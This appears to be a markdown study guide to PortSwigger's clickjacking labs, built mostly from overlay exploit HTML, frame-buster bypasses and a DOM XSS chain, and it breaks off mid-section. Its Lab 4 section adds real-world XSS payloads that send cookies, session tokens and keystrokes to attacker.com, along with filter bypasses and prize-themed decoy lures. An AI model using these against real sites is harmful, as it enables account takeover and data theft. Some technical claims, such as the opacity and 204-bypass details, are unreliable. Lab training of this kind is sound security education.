# Clickjacking - Complete PortSwigger Labs Guide

## Overview

This comprehensive guide covers all 5 PortSwigger Web Security Academy Clickjacking labs, providing detailed exploitation techniques, step-by-step solutions, exact payloads, and professional security guidance. Master clickjacking attacks from basic UI redressing to advanced frame-busting bypasses and DOM-based XSS exploitation.

### What is Clickjacking?

Clickjacking (also known as UI redressing) is an interface-based attack where users are tricked into clicking on actionable content on a hidden website by clicking on visible content on a decoy website. The attacker overlays an invisible, actionable webpage (typically in an iframe) on top of a decoy site using CSS positioning and opacity manipulation.

**Impact:**
- Unauthorized account actions (deletion, email changes)
- Credential theft through form manipulation
- Social engineering attacks (like-jacking, share-jacking)
- Privilege escalation
- Malware distribution
- DOM-based XSS trigger exploitation
- Privacy violations (webcam/microphone access)

**Key Differences from CSRF:**
- Requires active user interaction (clicking)
- Operates within legitimate authenticated sessions
- Bypasses CSRF token protection (tokens remain valid)
- Visual deception rather than request forgery
- Can exploit multiple clicks in sequence

## Table of Contents

1. [Lab 1: Basic Clickjacking with CSRF Token Protection](#lab-1-basic-clickjacking-with-csrf-token-protection)
2. [Lab 2: Clickjacking with Form Input Data Prefilled from URL Parameter](#lab-2-clickjacking-with-form-input-data-prefilled-from-url-parameter)
3. [Lab 3: Clickjacking with a Frame Buster Script](#lab-3-clickjacking-with-a-frame-buster-script)
4. [Lab 4: Exploiting Clickjacking to Trigger DOM-based XSS](#lab-4-exploiting-clickjacking-to-trigger-dom-based-xss)
5. [Lab 5: Multistep Clickjacking](#lab-5-multistep-clickjacking)

---

## Lab 1: Basic Clickjacking with CSRF Token Protection

### Lab Information
- **Difficulty Level:** Apprentice
- **URL:** https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected
- **Test Credentials:** wiener:peter
- **Target Browser:** Chrome

### Vulnerability Description

This lab demonstrates the fundamental clickjacking vulnerability where:
- The application has login functionality and account deletion
- Account deletion is protected by CSRF tokens
- No X-Frame-Options or CSP frame-ancestors headers prevent framing
- Users will click on elements displaying "click" on a decoy website

**Key Insight:** CSRF tokens do NOT protect against clickjacking because the iframe loads the legitimate page with a valid session context. The token is automatically included in the form submission triggered by the user's click.

### Objective

Craft HTML that frames the account page and tricks the user into deleting their account by clicking on a decoy button.

### Exploitation Steps

#### Step 1: Analyze Target Functionality

1. Log in with credentials: `wiener:peter`
2. Navigate to "My account" page: `/my-account`
3. Observe the "Delete account" button and form structure
4. Note that CSRF token is present but ineffective against clickjacking

#### Step 2: Create Basic PoC HTML

Access the exploit server and create the following HTML template:

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

**CSS Property Explanation:**
- `position: relative/absolute` - Enables precise positioning
- `opacity: 0.1` - Makes iframe semi-transparent for alignment (use 0.0001 for final exploit)
- `z-index: 2` - Places iframe above decoy button
- `width/height` - Ensures target page displays correctly
- `top/left` - Aligns decoy button with actual "Delete account" button

#### Step 3: Align Decoy Button with Target

1. Set `opacity: 0.1` to see both layers
2. Store and view the exploit
3. Hover over "Click me" button
4. Adjust `top` and `left` values of the div until the cursor changes to pointer when hovering over "Click me"
5. Fine-tune positioning by testing clicks

**Suggested Starting Positions:**
- iframe: `width: 500px`, `height: 700px`
- div: `top: 300px`, `left: 60px`

Adjust based on your specific lab instance.

#### Step 4: Finalize and Deploy Exploit

Once alignment is perfect:

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

1. Change `opacity` to `0.0001` (nearly invisible but still interactive)
2. Store the exploit
3. Click "Deliver exploit to victim"
4. Lab is solved when the victim's account is deleted

### HTTP Requests/Responses

**Exploit Delivery Request:**
```http
GET /exploit HTTP/1.1
Host: exploit-server.net
```

**Response with Exploit:**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<style>...</style>
<div>Click me</div>
<iframe src="victim.web-security-academy.net/my-account"></iframe>
```

**Victim's Delete Request (triggered by click):**
```http
POST /my-account/delete HTTP/1.1
Host: victim.web-security-academy.net
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

csrf=valid_token_here
```

### Burp Suite Features

- **Proxy → HTTP History:** Capture and analyze the account deletion request
- **Repeater:** Test the delete functionality and verify CSRF token presence
- **Clickbandit Tool:** Automate PoC generation (Burp menu → Burp Clickbandit)

### Common Mistakes

1. **Incorrect z-index ordering:** Ensure iframe has higher z-index than decoy
2. **Wrong opacity value:** Using 0 makes iframe non-interactive; use 0.0001
3. **Poor alignment:** Test thoroughly before deploying - misalignment fails
4. **Forgetting to test in target browser:** Always test in Chrome as specified
5. **Session issues:** Ensure victim is logged in when exploit is delivered

### Troubleshooting

| Issue | Solution |
|-------|----------|
| Iframe not loading | Check for X-Frame-Options in response headers |
| Click not triggering action | Verify z-index places iframe on top |
| Alignment off | Use opacity 0.1 to visually verify positioning |
| Lab not solving | Ensure opacity is 0.0001 not 0 for final exploit |

### Real-World Scenarios

- Account deletion on social media platforms
- Privilege escalation through admin actions
- Unauthorized financial transactions
- Privacy settings modification
- Malware installation through download buttons

---

## Lab 2: Clickjacking with Form Input Data Prefilled from URL Parameter

### Lab Information
- **Difficulty Level:** Apprentice
- **URL:** https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input
- **Test Credentials:** wiener:peter
- **Target Browser:** Chrome

### Vulnerability Description

This lab extends basic clickjacking by demonstrating:
- Form data can be prepopulated via URL parameters
- Email update form accepts GET parameter for email input
- No validation prevents email prepopulation
- Combined with clickjacking to change victim's email without consent

**Attack Vector:** Prepopulate form with attacker-controlled email, then overlay transparent "Update email" button with decoy.

### Objective

Change the victim's email address by prepopulating the form using a URL parameter and tricking the user into clicking an "Update email" button.

### Exploitation Steps

#### Step 1: Discover Form Prepopulation

1. Log in as `wiener:peter`
2. Navigate to `/my-account`
3. Test URL parameter injection: `/my-account?email=test@attacker.com`
4. Observe that email field is prepopulated

#### Step 2: Craft Exploit with Prepopulated Email

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=attacker@exploit-server.net"></iframe>
```

**Key Differences from Lab 1:**
- URL includes `?email=` parameter with attacker's email
- Target button is "Update email" instead of "Delete account"
- Different positioning values needed for alignment

#### Step 3: Align with Update Email Button

**Suggested Starting Positions:**
- iframe: `width: 500px`, `height: 700px`
- div: `top: 400px`, `left: 80px`

1. Set opacity to 0.1 for alignment testing
2. Store and view exploit
3. Hover over "Click me" to verify cursor changes over button
4. Adjust positioning as needed

#### Step 4: Deploy Final Exploit

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=attacker@exploit-server.net"></iframe>
```

1. Change opacity to 0.0001
2. Store exploit
3. Deliver to victim
4. Lab solves when victim's email is changed

### HTTP Requests/Responses

**Frame Loading Request:**
```http
GET /my-account?email=attacker@exploit-server.net HTTP/1.1
Host: victim.web-security-academy.net
Cookie: session=victim_session
```

**Response with Prepopulated Form:**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<form method="POST" action="/my-account/change-email">
    <input type="email" name="email" value="attacker@exploit-server.net">
    <input type="hidden" name="csrf" value="valid_token">
    <button>Update email</button>
</form>
```

**Email Update Request (triggered by click):**
```http
POST /my-account/change-email HTTP/1.1
Host: victim.web-security-academy.net
Cookie: session=victim_session
Content-Type: application/x-www-form-urlencoded

email=attacker@exploit-server.net&csrf=valid_token
```

### Burp Suite Features

- **Proxy → HTTP History:** Observe email parameter in URL
- **Repeater:** Test email parameter injection
- **Intruder:** Test various email formats
- **Clickbandit:** Generate alignment automatically

### Common Mistakes

1. **Wrong email domain:** Use exploit server domain or unique identifier
2. **Testing with same email repeatedly:** Lab prevents duplicate emails - use different addresses for testing vs final delivery
3. **Misaligned button:** "Update email" button position differs from "Delete account"
4. **Parameter encoding issues:** Ensure @ and other special characters are properly encoded if needed

### Troubleshooting

| Issue | Solution |
|-------|----------|
| Email not prepopulating | Verify parameter name is correct (email=) |
| Duplicate email error | Use different email addresses for testing |
| Form not submitting | Check that click actually triggers button |
| Lab not solving | Ensure final opacity is 0.0001 not 0 |

### Real-World Scenarios

- Account takeover via email change → password reset
- Profile hijacking on social networks
- Subscription manipulation
- Communication interception
- Identity theft preparation

### Attack Variations

1. **Multiple parameter injection:** Prepopulate multiple fields
2. **JavaScript URL manipulation:** Use hash fragments with client-side code
3. **Combined with XSS:** Inject malicious email addresses containing payloads
4. **Time-delayed attacks:** Use JavaScript to change values after rendering

---

## Lab 3: Clickjacking with a Frame Buster Script

### Lab Information
- **Difficulty Level:** Practitioner
- **URL:** https://portswigger.net/web-security/clickjacking/lab-frame-buster-script
- **Test Credentials:** wiener:peter
- **Target Browser:** Chrome

### Vulnerability Description

This lab demonstrates advanced clickjacking against a site protected by frame-busting code:
- Page contains JavaScript to detect and prevent framing
- Traditional iframe loading triggers redirect or breakout
- HTML5 sandbox attribute can neutralize frame busters
- Proper sandbox configuration allows form submission while blocking scripts

**Frame Buster Example:**
```javascript
if (top != self) {
    top.location = self.location;
}
```

### Objective

Bypass the frame buster script using HTML5 sandbox attribute and trick the user into changing their email address.

### Exploitation Steps

#### Step 1: Confirm Frame Busting Protection

1. Try basic iframe without sandbox:
```html
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
2. Observe that page either:
   - Redirects to break out of frame
   - Displays blank/error
   - Refuses to load

#### Step 2: Bypass with Sandbox Attribute

The HTML5 `sandbox` attribute restricts iframe capabilities. By using `sandbox="allow-forms"`, we:
- **Allow:** Form submission functionality
- **Block:** JavaScript execution (neutralizes frame buster)
- **Block:** Top-level navigation (prevents breakout)

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="YOUR-LAB-ID.web-security-academy.net/my-account?email=attacker@exploit-server.net"></iframe>
```

**Sandbox Attribute Values:**
- `allow-forms` - Permits form submission
- `allow-scripts` - Permits JavaScript (would enable frame buster - DON'T USE)
- `allow-top-navigation` - Permits breakout (would enable frame buster - DON'T USE)
- `allow-same-origin` - Treats content as same-origin

**Critical:** Only use `allow-forms` to bypass frame buster while maintaining form functionality.

#### Step 3: Align and Deploy

**Suggested Starting Positions:**
- iframe: `width: 500px`, `height: 700px`
- div: `top: 400px`, `left: 80px`

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="YOUR-LAB-ID.web-security-academy.net/my-account?email=attacker@exploit-server.net"></iframe>
```

1. Align using opacity 0.1
2. Finalize with opacity 0.0001
3. Store and deliver exploit
4. Lab solves when email is changed

### HTTP Requests/Responses

**Frame Loading Request (with sandbox):**
```http
GET /my-account?email=attacker@exploit-server.net HTTP/1.1
Host: victim.web-security-academy.net
Cookie: session=victim_session
```

**Response with Frame Buster (neutralized by sandbox):**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<script>
if (top != self) {
    top.location = self.location; // This script doesn't execute due to sandbox
}
</script>
<form method="POST" action="/my-account/change-email">
    <input type="email" name="email" value="attacker@exploit-server.net">
    <button>Update email</button>
</form>
```

**Email Update Request:**
```http
POST /my-account/change-email HTTP/1.1
Host: victim.web-security-academy.net
Cookie: session=victim_session
Content-Type: application/x-www-form-urlencoded

email=attacker@exploit-server.net&csrf=valid_token
```

### Burp Suite Features

- **Proxy → HTTP History:** Identify frame busting JavaScript in response
- **Repeater:** Analyze page structure and defenses
- **Clickbandit:** Note that Clickbandit has option to "Sandbox iframe"
- **Spider/Crawler:** Find pages with frame-busting code

### Common Mistakes

1. **Using allow-scripts:** This enables the frame buster - forms work but iframe breaks out
2. **Forgetting sandbox attribute:** Page won't load or will break out
3. **Using allow-top-navigation:** Permits breakout even without scripts
4. **Empty sandbox:** `sandbox=""` blocks forms - functionality breaks

### Troubleshooting

| Issue | Solution |
|-------|----------|
| Frame still breaking out | Remove allow-top-navigation from sandbox |
| Form not submitting | Ensure sandbox includes allow-forms |
| JavaScript errors | This is expected - sandbox blocks scripts |
| Page displays incorrectly | Sandbox may affect styling; adjust dimensions |

### Frame Buster Variants and Bypasses

#### Common Frame Buster Patterns

**Pattern 1: Top Location Redirect**
```javascript
if (top != self) {
    top.location = self.location;
}
```
**Bypass:** `sandbox="allow-forms"` (blocks scripts)

**Pattern 2: Parent Frame Manipulation**
```javascript
if (parent.frames.length > 0) {
    parent.location = self.location;
}
```
**Bypass:** `sandbox="allow-forms"` (blocks scripts)

**Pattern 3: Framebusting with onBeforeUnload**
```javascript
window.onbeforeunload = function() {
    return false;
}
```
**Bypass:** `sandbox="allow-forms"` (blocks event handlers)

**Pattern 4: Double Framing Protection**
```javascript
if (top.location != self.location) {
    top.location = self.location;
}
```
**Bypass:** Same sandbox technique applies

#### Alternative Bypass: 204 Response

Some frame busters can be bypassed by responding with HTTP 204 (No Content) to the top frame navigation attempt, though this requires server-side control.

### Real-World Scenarios

- Banking sites with frame-busting protection
- Government portals with security measures
- Enterprise applications with anti-framing
- Payment gateways attempting to prevent embedding
- Sites implementing incomplete clickjacking defenses

### Research Paper Reference

This technique is detailed in the Stanford research paper "Busting Frame Busting: a Study of Clickjacking Vulnerabilities on Popular Sites" by Rydstedt, Bursztein, Boneh, and Jackson (2010), which demonstrated that all surveyed frame-busting implementations could be bypassed.

---

## Lab 4: Exploiting Clickjacking to Trigger DOM-based XSS

### Lab Information
- **Difficulty Level:** Practitioner
- **URL:** https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss
- **Test Credentials:** Not required (anonymous feedback form)
- **Target Browser:** Chrome

### Vulnerability Description

This lab combines two vulnerabilities for a powerful attack:
- DOM-based XSS vulnerability triggered by user interaction
- Feedback form accepts name parameter that's processed by DOM
- XSS payload executes when submit button is clicked
- No authentication required - broader victim pool

**Attack Chain:**
1. Inject XSS payload via URL parameter
2. Use clickjacking to overlay invisible submit button
3. Trick user into clicking decoy button
4. Submit triggers XSS execution

### Objective

Construct a clickjacking attack that tricks the user into clicking a button to trigger `print()` function via DOM-based XSS.

### Exploitation Steps

#### Step 1: Identify XSS Injection Point

1. Navigate to feedback form: `/feedback`
2. Test parameter injection: `/feedback?name=<img src=1 onerror=alert(1)>`
3. Observe that name parameter is reflected in DOM
4. Confirm XSS triggers on form submission

**XSS Payload for Testing:**
```html
<img src=1 onerror=alert('XSS')>
```

**Final Payload:**
```html
<img src=1 onerror=print()>
```

#### Step 2: Craft Combined Exploit

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 600px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>"></iframe>
```

**Key Components:**
- URL includes XSS payload in name parameter
- Transparent iframe overlays feedback form
- Decoy button aligns with "Submit feedback" button
- Click triggers form submission → XSS execution → print()

#### Step 3: URL Encoding Considerations

Ensure payload is properly encoded:
```
Original: <img src=1 onerror=print()>
URL: %3Cimg%20src%3D1%20onerror%3Dprint()%3E
```

Most browsers handle this automatically in iframe src, but test if issues arise.

#### Step 4: Align and Deploy

**Suggested Starting Positions:**
- iframe: `width: 500px`, `height: 700px`
- div: `top: 600px`, `left: 80px` (submit button is lower on page)

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 600px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>"></iframe>
```

1. Test alignment with opacity 0.1
2. Finalize with opacity 0.0001
3. Store and deliver exploit
4. Lab solves when print() function executes

### HTTP Requests/Responses

**Frame Loading Request:**
```http
GET /feedback?name=<img src=1 onerror=print()> HTTP/1.1
Host: victim.web-security-academy.net
```

**Response with XSS Payload:**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<form method="POST" action="/feedback/submit">
    <input type="text" name="name" value="<img src=1 onerror=print()>">
    <button>Submit feedback</button>
</form>
<script>
    // Vulnerable DOM manipulation
    document.querySelector('input[name=name]').value = getUrlParameter('name');
</script>
```

**Form Submission (triggers XSS):**
```http
POST /feedback/submit HTTP/1.1
Host: victim.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

name=<img src=1 onerror=print()>
```

**JavaScript Execution:**
The submit triggers DOM processing which executes the onerror handler, calling `print()`.

### Burp Suite Features

- **Proxy → HTTP History:** Identify XSS injection points
- **Repeater:** Test XSS payloads independently
- **Intruder:** Enumerate XSS vectors and bypass filters
- **Clickbandit:** Generate alignment automatically
- **DOM Invader:** Browser extension to identify DOM XSS sinks

### Common Mistakes

1. **Wrong payload:** Using `alert()` instead of `print()` as specified
2. **Encoding issues:** Special characters in URL breaking payload
3. **Misaligned submit button:** Button is further down page than account forms
4. **Testing without delivery:** XSS must execute in victim context
5. **Forgetting img tag:** Payload must be valid DOM XSS exploit

### Troubleshooting

| Issue | Solution |
|-------|----------|
| XSS not executing | Verify payload works standalone first |
| Print() not triggering | Check browser console for JavaScript errors |
| Form not submitting | Ensure click alignment is accurate |
| Lab not solving | Confirm print() function actually executes |

### Attack Variations

**Alternative XSS Payloads:**
```html
<!-- SVG-based -->
<svg onload=print()>

<!-- Image-based (original) -->
<img src=x onerror=print()>

<!-- Body tag -->
<body onload=print()>

<!-- Iframe-based -->
<iframe onload=print()>
```

**More Malicious Payloads (Real-World):**
```html
<!-- Cookie theft -->
<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>

<!-- Session hijacking -->
<img src=x onerror=location='https://attacker.com/steal?s='+localStorage.getItem('session')>

<!-- Keylogger -->
<img src=x onerror=document.onkeypress=function(e){fetch('https://attacker.com?k='+e.key)}>

<!-- Account takeover -->
<img src=x onerror=fetch('/change-email',{method:'POST',body:'email=attacker@evil.com'})>
```

### Real-World Scenarios

- Comment sections with DOM-based XSS
- Search functionality processing user input
- Contact forms vulnerable to injection
- Profile pages with reflected parameters
- URL fragment-based XSS in SPAs

### Defense Bypass Techniques

If filters are present:
```html
<!-- Uppercase tags -->
<IMG SRC=x ONERROR=print()>

<!-- Mixed case event handlers -->
<img src=x OnErRoR=print()>

<!-- Alternative attributes -->
<img src=x onmouseover=print()>

<!-- SVG bypass -->
<svg><script>print()</script></svg>

<!-- HTML entities -->
<img src=x onerror=&#112;&#114;&#105;&#110;&#116;()>
```

---

## Lab 5: Multistep Clickjacking

### Lab Information
- **Difficulty Level:** Practitioner
- **URL:** https://portswigger.net/web-security/clickjacking/lab-multistep
- **Test Credentials:** wiener:peter
- **Target Browser:** Chrome

### Vulnerability Description

This lab demonstrates advanced multi-step clickjacking requiring:
- Sequential user interactions (multiple clicks)
- Account deletion protected by CSRF token
- Confirmation dialog to prevent accidental deletion
- Precise alignment of two separate decoy actions
- Each click must trigger correct action in sequence

**Challenge:** Coordinate two overlay elements to match:
1. First click → "Delete account" button
2. Second click → "Yes" confirmation button

### Objective

Construct an attack that fools the user into clicking the delete account button AND the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions.

### Exploitation Steps

#### Step 1: Analyze Multi-Step Flow

1. Log in as `wiener:peter`
2. Navigate to `/my-account`
3. Click "Delete account" - observe confirmation dialog appears
4. Click "Yes" - account is deleted
5. Note positions of both buttons for overlay alignment

#### Step 2: Create Two-Overlay Exploit

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position: absolute;
        z-index: 1;
    }
    .firstClick {
        top: 330px;
        left: 50px;
    }
    .secondClick {
        top: 285px;
        left: 225px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

**CSS Structure:**
- Single iframe containing target page
- Two separate div elements as decoy buttons
- Different positioning for each decoy
- Sequential naming guides user behavior

#### Step 3: Align First Click

**First Button Alignment:**
1. Set opacity to 0.1
2. Store and view exploit
3. Hover over "Click me first"
4. Adjust `.firstClick` top/left until cursor changes over "Delete account"

**Suggested Starting Position:**
- `top: 330px`
- `left: 50px`

#### Step 4: Align Second Click

**After first click, confirmation dialog appears:**
1. Click "Click me first" to trigger dialog
2. Hover over "Click me next"
3. Adjust `.secondClick` top/left until aligned with "Yes" button

**Suggested Starting Position:**
- `top: 285px`
- `left: 225px`

**Note:** Confirmation dialog appears in same iframe but overlays the page. The second decoy must align with the dialog button position.

#### Step 5: Finalize and Deploy

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position: absolute;
        z-index: 1;
    }
    .firstClick {
        top: 330px;
        left: 50px;
    }
    .secondClick {
        top: 285px;
        left: 225px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

1. Change opacity to 0.0001
2. Store exploit
3. Test sequence yourself first
4. Deliver to victim
5. Lab solves when account is deleted after both clicks

### HTTP Requests/Responses

**Initial Frame Load:**
```http
GET /my-account HTTP/1.1
Host: victim.web-security-academy.net
Cookie: session=victim_session
```

**First Click - Delete Account Request:**
```http
POST /my-account/delete HTTP/1.1
Host: victim.web-security-academy.net
Cookie: session=victim_session
Content-Type: application/x-www-form-urlencoded

csrf=valid_token
```

**Response with Confirmation Dialog:**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<div class="confirmation-dialog">
    <p>Are you sure you want to delete your account?</p>
    <form method="POST" action="/my-account/delete/confirm">
        <input type="hidden" name="csrf" value="new_token">
        <button name="confirm" value="yes">Yes</button>
        <button name="confirm" value="no">No</button>
    </form>
</div>
```

**Second Click - Confirmation:**
```http
POST /my-account/delete/confirm HTTP/1.1
Host: victim.web-security-academy.net
Cookie: session=victim_session
Content-Type: application/x-www-form-urlencoded

csrf=new_token&confirm=yes
```

**Final Response:**
```http
HTTP/1.1 302 Found
Location: /
Set-Cookie: session=; expires=Thu, 01 Jan 1970 00:00:00 GMT

Account deleted successfully
```

### Burp Suite Features

- **Proxy → HTTP History:** Observe multi-step flow and CSRF tokens
- **Repeater:** Test each step independently
- **Sequencer:** Analyze CSRF token entropy (both tokens)
- **Clickbandit:** Record multi-step click sequence automatically
  - Click "Record mode"
  - Perform both clicks
  - Click "Finish" to generate HTML

### Common Mistakes

1. **Single overlay:** Using one decoy for both actions - users won't click twice
2. **Wrong click order:** Aligning "next" before "first" - confuses users
3. **Poor visual guidance:** Not indicating sequence clearly
4. **Misaligned confirmation:** Hardest part - dialog position differs from page elements
5. **Not testing sequence:** Always test both clicks work before delivery

### Troubleshooting

| Issue | Solution |
|-------|----------|
| Confirmation not appearing | First click may be misaligned with Delete button |
| Second click misaligned | Dialog position differs from page buttons - readjust |
| Only one action works | Verify both z-index values and opacity settings |
| Sequence unclear | Use descriptive text: "Click me first" vs "Click me next" |
| Lab not solving | Ensure both actions complete and account deletes |

### Advanced Techniques

**Time-Based Delays:**
```html
<style>
    .secondClick {
        display: none;
    }
</style>
<script>
    document.querySelector('.firstClick').addEventListener('click', function() {
        setTimeout(function() {
            document.querySelector('.secondClick').style.display = 'block';
        }, 500); // Delay second button appearance
    });
</script>
```

**Progressive Opacity:**
```html
<script>
    document.querySelector('.firstClick').addEventListener('click', function() {
        setTimeout(function() {
            let iframe = document.querySelector('iframe');
            iframe.style.opacity = '0.1'; // Briefly show for debugging
            setTimeout(function() {
                iframe.style.opacity = '0.0001';
            }, 1000);
        }, 100);
    });
</script>
```

**Visual Feedback:**
```html
<style>
    .firstClick:hover {
        background-color: #3366ff;
        color: white;
    }
    .secondClick {
        background-color: #ccc;
        pointer-events: none;
    }
    .secondClick.active {
        background-color: #ff6633;
        pointer-events: auto;
    }
</style>
<script>
    document.querySelector('.firstClick').addEventListener('click', function() {
        document.querySelector('.secondClick').classList.add('active');
    });
</script>
```

### Real-World Scenarios

- Banking transfers requiring confirmation
- Account deletion with multi-step verification
- Privilege escalation with approval dialogs
- Payment processing with confirmation screens
- Settings changes with warning dialogs
- Two-factor authentication bypass
- Administrative actions with safeguards

### Social Engineering Enhancements

**Game-Like Interface:**
```html
<div style="text-align: center; font-family: Arial;">
    <h2>Win a Prize! 🎁</h2>
    <p>Click the buttons in order to claim your reward!</p>
    <div class="firstClick" style="padding: 20px; background: linear-gradient(45deg, #f39c12, #e67e22); border-radius: 10px; cursor: pointer; display: inline-block; margin: 10px;">
        🎯 STEP 1: Click Here!
    </div>
    <div class="secondClick" style="padding: 20px; background: linear-gradient(45deg, #27ae60, #16a085); border-radius: 10px; cursor: pointer; display: inline-block; margin: 10px;">
        ✨ STEP 2: Claim Prize!
    </div>
    <iframe src="..."></iframe>
</div>
```

**Survey Pattern:**
```html
<div style="background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
    <h3>Quick Survey - 2 Questions</h3>
    <p><strong>Question 1:</strong> Do you like our website?</p>
    <div class="firstClick" style="padding: 10px 20px; background: #4CAF50; color: white; border-radius: 5px; cursor: pointer; display: inline-block;">
        Yes
    </div>
    <p><strong>Question 2:</strong> Would you recommend us?</p>
    <div class="secondClick" style="padding: 10px 20px; background: #2196F3; color: white; border-radius: 5px; cursor: pointer; display: inline-block;">
        Definitely
    </div>
    <iframe src="..."></iframe>
</div>
```

### Attack Chain Expansion

This technique can extend to 3+ clicks:
```html
<div class="click1">Click me first</div>
<div class="click2">Click me second</div>
<div class="click3">Click me third</div>
<!-- Each aligned with subsequent action -->
```

Applications:
- Multi-step checkout hijacking
- Progressive privilege escalation
- Complex form submission sequences
- Wizard-style interface exploitation

---

## Clickjacking Attack Techniques - Comprehensive Guide

### Core Exploitation Methods

#### 1. Basic UI Redressing

**Principle:** Layer transparent iframe over decoy content using CSS positioning and opacity.

**Essential CSS Properties:**
```css
iframe {
    position: relative;      /* or absolute/fixed depending on layout */
    opacity: 0.0001;        /* Nearly invisible but still interactive */
    z-index: 999;           /* Ensure iframe is on top */
    width: 500px;           /* Adjust to target page size */
    height: 700px;
}

.decoy {
    position: absolute;
    z-index: 1;             /* Below iframe */
    top: 300px;            /* Aligned with target button */
    left: 60px;
}
```

**Key Considerations:**
- Opacity must be > 0 (exactly 0 makes element non-interactive)
- Z-index ordering is critical (higher = on top)
- Position absolute/relative required for precise alignment
- Test across browsers - rendering may differ

#### 2. Form Data Prepopulation

**Technique:** Manipulate URL parameters to prefill form fields with attacker-controlled data.

**Attack Pattern:**
```html
<iframe src="https://target.com/form?email=attacker@evil.com&amount=9999"></iframe>
```

**Discovery Process:**
1. Intercept form submission requests
2. Identify parameter names
3. Test GET request with parameters: `/form?param=value`
4. Check if form fields prepopulate
5. Combine with clickjacking overlay

**Real-World Examples:**
- Email change: `?email=attacker@evil.com`
- Amount modification: `?amount=9999`
- Recipient change: `?recipient=attacker`
- Settings toggle: `?setting=enabled`

#### 3. Frame Buster Bypass

**Common Frame Buster Patterns:**

```javascript
// Pattern 1: Top location check
if (top.location != self.location) {
    top.location = self.location;
}

// Pattern 2: Framesets detection
if (parent.frames.length > 0) {
    parent.location.href = self.location.href;
}

// Pattern 3: onBeforeUnload
window.onbeforeunload = function() {
    return "This page is attempting to break out of a frame";
}
```

**Bypass Using HTML5 Sandbox:**

```html
<!-- Blocks JavaScript, allows forms -->
<iframe sandbox="allow-forms" src="https://target.com"></iframe>

<!-- Multiple permissions -->
<iframe sandbox="allow-forms allow-pointer-lock" src="https://target.com"></iframe>
```

**Sandbox Attributes Reference:**

| Attribute | Effect | Use in Bypass |
|-----------|--------|---------------|
| (empty) | Maximum restrictions | Blocks frame busters BUT also blocks forms |
| allow-forms | Permits form submission | ✅ Required for exploitation |
| allow-scripts | Permits JavaScript | ❌ Enables frame buster |
| allow-top-navigation | Permits breakout | ❌ Enables frame buster |
| allow-same-origin | Treats as same origin | ⚠️ Use carefully |
| allow-popups | Permits window.open | Not needed for basic attacks |
| allow-pointer-lock | Permits pointer lock API | Optional enhancement |

**Alternative Bypass: 204 Response** (requires attacker control of framing page):
```javascript
// Intercept top navigation
window.onload = function() {
    window.stop(); // Stop frame buster execution
};
```

#### 4. Multi-Step Clickjacking

**Technique:** Chain multiple clicks to complete complex actions requiring confirmation.

**Implementation Strategy:**
```html
<style>
    .step1 { position: absolute; top: 100px; left: 50px; z-index: 1; }
    .step2 { position: absolute; top: 200px; left: 100px; z-index: 1; }
    .step3 { position: absolute; top: 150px; left: 150px; z-index: 1; }
    iframe { z-index: 2; opacity: 0.0001; }
</style>
<div class="step1">Click First</div>
<div class="step2">Click Second</div>
